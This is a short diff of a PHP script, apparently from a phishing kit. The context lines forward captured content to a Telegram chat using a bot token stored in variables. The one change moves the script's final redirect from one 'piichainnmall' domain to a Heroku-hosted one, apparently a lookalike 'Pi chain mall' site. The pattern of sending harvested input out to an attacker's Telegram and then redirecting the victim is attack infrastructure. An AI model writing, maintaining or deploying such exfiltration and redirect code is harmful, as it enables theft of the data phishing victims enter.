@@ -28,5 +28,5 @@ if (!empty($content)) {  // Pengecekan apakah $content tidak kosong
     sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot);
 }
 
-header('Location: https://piichainnmall.site');
+header('Location: https://piichainnmall-2e8b858a9717.herokuapp.com');
 ?>
